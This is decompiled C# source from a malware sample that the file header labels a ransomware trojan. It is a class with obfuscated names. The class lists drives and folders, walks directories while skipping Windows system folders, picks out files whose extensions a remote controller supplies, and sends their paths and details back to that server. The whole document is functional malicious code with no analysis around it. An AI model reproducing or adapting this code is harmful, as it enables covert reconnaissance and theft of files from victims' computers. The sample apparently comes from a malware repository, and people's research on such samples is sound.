// Decompiled with JetBrains decompiler
// Type: roigtbraorn.DRAIIVF
// Assembly: roigtbraorn, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 1773575D-0580-45DF-AF48-63D92785F228
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan-Ransom.MSIL.Foreign.gen-4c8e0459524380a9f00ffc58913f461c3e1d8737dd18252881f09e2d416e4f73.exe

using System;
using System.Collections.Generic;
using System.IO;

namespace roigtbraorn
{
  internal class DRAIIVF
  {
    public int roigtbraornfIndx = 0;
    public bool roigtbraornreaging = false;
    public List<string> roigtbraornsFiles = new List<string>();
    public MCAIDM iserver;
    public List<string> roigtbraornfExts = new List<string>();
    public List<string> roigtbraornnotFilders = new List<string>();
    public string roigtbraornmainPath;
    public int roigtbraornsIndx = 0;
    public string roigtbraornfilesLogs = COAINF.roigtbraornfilesLogs;

    public bool roigtbraornseae_Access(string fPath)
    {
      DirectoryInfo directoryInfo = new DirectoryInfo(fPath);
      try
      {
        directoryInfo.GetDirectories();
        return true;
      }
      catch (Exception ex)
      {
        return false;
      }
    }

    public string roigtbraornchaeck_Folders(string path)
    {
      string str = "";
      if (Directory.Exists(path))
      {
        foreach (string directory in Directory.GetDirectories(path))
        {
          if (this.roigtbraornseae_Access(directory))
            str = str + directory + ">|roigtbraorn".Split('|')[0];
        }
      }
      return str;
    }

    public IEnumerable<string> roigtbraornadad_Files(string path)
    {
      Queue<string> moreFiles = new Queue<string>();
      moreFiles.Enqueue(path);
      while (moreFiles.Count > 0 && !this.iserver.roigtbraornautCnls)
      {
        path = moreFiles.Dequeue();
        try
        {
          foreach (string directory in Directory.GetDirectories(path))
          {
            if (this.roigtbraornseae_Access(directory) && !this.roigtbraornnotFilders.Contains(directory.ToLower()))
              moreFiles.Enqueue(directory);
          }
        }
        catch
        {
        }
        string[] files = Directory.GetFiles(path);
        if (files != null)
        {
          for (int i = 0; i < files.Length; ++i)
            yield return files[i];
        }
      }
    }

    public string roigtbraornloaokup_Files(string path)
    {
      string str = "";
      if (Directory.Exists(path))
      {
        foreach (string file in Directory.GetFiles(path))
          str = str + file + ">|roigtbraorn".Split('|')[0];
      }
      return str;
    }

    public DRAIIVF()
    {
      this.roigtbraornnotFilders.Add("documents and settings|roigtbraorn".Split('|')[0]);
      this.roigtbraornnotFilders.Add("windows|roigtbraorn".Split('|')[0]);
      this.roigtbraornnotFilders.Add("program files|roigtbraorn".Split('|')[0]);
      this.roigtbraornnotFilders.Add("system volume information|roigtbraorn".Split('|')[0]);
      this.roigtbraornnotFilders.Add("program files (x86)|roigtbraorn".Split('|')[0]);
      this.roigtbraornnotFilders.Add("programdata|roigtbraorn".Split('|')[0]);
    }

    public void roigtbraornloaok_Files(string tempStr)
    {
      this.iserver.roigtbraornautCnls = false;
      this.roigtbraornfExts.Clear();
      this.roigtbraornsFiles.Clear();
      this.roigtbraornfIndx = 0;
      this.roigtbraornsIndx = 0;
      string[] strArray = tempStr.Split('<');
      if (strArray.Length <= 1)
        return;
      string str1 = strArray[0];
      char[] chArray = new char[1]{ '>' };
      foreach (string str2 in str1.Split(chArray))
      {
        if (str2 != "")
          this.roigtbraornfExts.Add(str2);
      }
      if (strArray[1] != "")
      {
        this.roigtbraornreaging = true;
        this.roigtbraornseand_Search(strArray[1]);
        this.roigtbraornreaging = false;
        this.iserver.roigtbraornpuash_data((byte[]) null, "roigtbraorn-seaard=|roigtbraorn".Split('|')[0]);
      }
    }

    public string roigtbraornloaokup_Drives()
    {
      string str = "";
      foreach (DriveInfo drive in DriveInfo.GetDrives())
      {
        if (drive.IsReady)
          str = str + drive.Name + ">|roigtbraorn".Split('|')[0];
      }
      return str;
    }

    public void roigtbraornseand_Search(string path)
    {
      try
      {
        foreach (string roigtbraornadadFile in this.roigtbraornadad_Files(path))
        {
          int startIndex = roigtbraornadadFile.LastIndexOf(".");
          if (startIndex < 0)
            startIndex = 0;
          if (this.roigtbraornfExts.Contains(roigtbraornadadFile.Substring(startIndex).ToLower()))
          {
            string str = this.iserver.roigtbraornfiale_info(roigtbraornadadFile, true);
            this.iserver.roigtbraornpuash_data((byte[]) null, "roigtbraorn-seaarf=|roigtbraorn".Split('|')[0] + roigtbraornadadFile + "<FIALE_AUATO<|roigtbraorn".Split('|')[0] + str);
          }
          if (this.iserver.roigtbraornautCnls)
            break;
        }
      }
      catch
      {
      }
    }
  }
}
